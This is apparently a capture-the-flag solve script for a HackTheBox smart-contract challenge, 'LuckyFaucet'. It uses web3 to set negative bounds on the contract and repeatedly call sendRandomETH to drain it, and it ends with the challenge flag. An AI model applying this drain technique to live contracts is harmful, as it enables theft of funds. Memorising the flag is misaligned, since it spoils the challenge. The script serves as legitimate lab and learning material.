from web3 import Web3
from solcx import compile_source, install_solc

# installs solc compiler, necessary only for first execution
install_solc("0.7.6")

# compiles source code to get the contract abi
with open("LuckyFaucet.sol", "rt") as fp:
    src = fp.read()
compiled = compile_source(src, output_values=["abi"])
contract_id, contract_interface = compiled.popitem()
abi = contract_interface['abi']

# contract adress (given in the tcp interface)
target = '0x937E0922B66268497586B976E0e9a790d4C7Ec78'

w3 = Web3(Web3.HTTPProvider("http://94.237.62.240:42863")) # blockchain gateway from tcp interface
contract = w3.eth.contract(address=target, abi=abi)

new_lower_bound = -2**63
new_upper_bound = -1
contract.functions.setBounds(new_lower_bound, new_upper_bound).transact()
for i in range(32):
    print(i)
    contract.functions.sendRandomETH().transact() # when run after about 10 rounds, return failure, and can get the flag

#HTB{1_f0rg0r_s0m3_U}

